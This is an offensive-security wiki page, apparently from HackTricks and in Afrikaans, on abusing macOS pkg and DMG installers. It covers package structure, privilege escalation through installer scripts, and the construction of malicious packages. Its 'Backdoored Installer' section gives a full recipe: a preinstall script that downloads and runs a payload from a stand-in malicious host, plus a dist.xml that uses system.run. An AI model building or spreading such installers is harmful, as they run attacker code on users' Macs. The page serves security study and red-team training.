# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basiese Inligting

'n macOS **installer pakket** (ook bekend as 'n `.pkg` lêer) is 'n lêerformaat wat deur macOS gebruik word om **sagteware** te **versprei**. Hierdie lêers is soos 'n **doos wat alles bevat wat 'n stuk sagteware** nodig het om korrek te installeer en te werk.

Die pakketlêer self is 'n argief wat 'n **hiërargie van lêers en gidse bevat wat op die teiken** rekenaar geïnstalleer sal word. Dit kan ook **scripts** insluit om take voor en na die installasie uit te voer, soos om konfigurasielêers op te stel of ou weergawes van die sagteware skoon te maak.

### Hiërargie

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Verspreiding (xml)**: Aangepashede (titel, welkom teks…) en script/installasie kontroles
- **PakketInligting (xml)**: Inligting, installasie vereistes, installasie ligging, paaie na scripts om uit te voer
- **Materiaalstaat (bom)**: Lys van lêers om te installeer, op te dateer of te verwyder met lêer toestemmings
- **Payload (CPIO argief gzip gecomprimeer)**: Lêers om te installeer in die `install-location` van PakketInligting
- **Scripts (CPIO argief gzip gecomprimeer)**: Voor- en na-installasie scripts en meer hulpbronne wat na 'n tydelike gids uitgehaal is vir uitvoering.

### Decomprimeer
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Om die inhoud van die installeerder te visualiseer sonder om dit handmatig te dekomprimeer, kan jy ook die gratis hulpmiddel [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) gebruik.

## DMG Basiese Inligting

DMG-lêers, of Apple Disk Images, is 'n lêerformaat wat deur Apple se macOS vir skyfbeelde gebruik word. 'n DMG-lêer is in wese 'n **aansluitbare skyfbeeld** (dit bevat sy eie lêerstelsel) wat rou blokdata bevat wat tipies gecomprimeer en soms versleuteld is. Wanneer jy 'n DMG-lêer oopmaak, **aansluit macOS dit asof dit 'n fisiese skyf is**, wat jou toelaat om toegang tot die inhoud te verkry.

> [!CAUTION]
> Let daarop dat **`.dmg`** installeerders **soveel formate** ondersteun dat sommige daarvan in die verlede wat kwesbaarhede bevat het, misbruik is om **kernel kode-uitvoering** te verkry.

### Hiërargie

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Die hiërargie van 'n DMG-lêer kan verskil op grond van die inhoud. Dit volg egter gewoonlik hierdie struktuur vir toepassings DMGs:

- Topvlak: Dit is die wortel van die skyfbeeld. Dit bevat dikwels die toepassing en moontlik 'n skakel na die Toepassings-gids.
- Toepassing (.app): Dit is die werklike toepassing. In macOS is 'n toepassing tipies 'n pakket wat baie individuele lêers en gidse bevat wat die toepassing saamstel.
- Toepassingskakel: Dit is 'n snelkoppeling na die Toepassings-gids in macOS. Die doel hiervan is om dit maklik te maak om die toepassing te installeer. Jy kan die .app-lêer na hierdie snelkoppeling sleep om die app te installeer.

## Privesc via pkg misbruik

### Uitvoering vanaf openbare gidse

As 'n vooraf of na-installasie skrip byvoorbeeld uitvoer vanaf **`/var/tmp/Installerutil`**, en 'n aanvaller daardie skrip kan beheer, kan hy privilige verhoog wanneer dit uitgevoer word. Of 'n ander soortgelyke voorbeeld:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Dit is 'n [openbare funksie](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) wat verskeie installeerders en opdaterings sal aanroep om **iets as root uit te voer**. Hierdie funksie aanvaar die **pad** van die **lêer** om te **uitvoer** as parameter, egter, as 'n aanvaller hierdie lêer kan **wysig**, sal hy in staat wees om sy uitvoering met root te **misbruik** om **privilege te verhoog**.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
For more info check this talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Uitvoering deur te monteer

As 'n installer na `/tmp/fixedname/bla/bla` skryf, is dit moontlik om **'n monteer** oor `/tmp/fixedname` te skep met geen eienaars sodat jy **enige lêer tydens die installasie kan wysig** om die installasieproses te misbruik.

'n Voorbeeld hiervan is **CVE-2021-26089** wat daarin geslaag het om **'n periodieke skrip te oorskryf** om uitvoering as root te verkry. Vir meer inligting, kyk na die praatjie: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Leë Payload

Dit is moontlik om net 'n **`.pkg`** lêer te genereer met **pre- en post-install skripte** sonder enige werklike payload behalwe die malware binne die skripte.

### JS in Verspreiding xml

Dit is moontlik om **`<script>`** etikette in die **verspreiding xml** lêer van die pakket toe te voeg en daardie kode sal uitgevoer word en dit kan **opdragte uitvoer** met behulp van **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

### Backdoored Installer

Kwaadwillige installer wat 'n skrip en JS-kode binne dist.xml gebruik
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Verwysings

- [**DEF CON 27 - Ontpakking van Pkgs 'n Kyk Binne Macos Installer Pakkette en Algemene Sekuriteitsfoute**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "Die Wilde Wêreld van macOS Installeerders" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Ontpakking van Pkgs 'n Kyk Binne MacOS Installer Pakkette**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)

{{#include ../../../banners/hacktricks-training.md}}
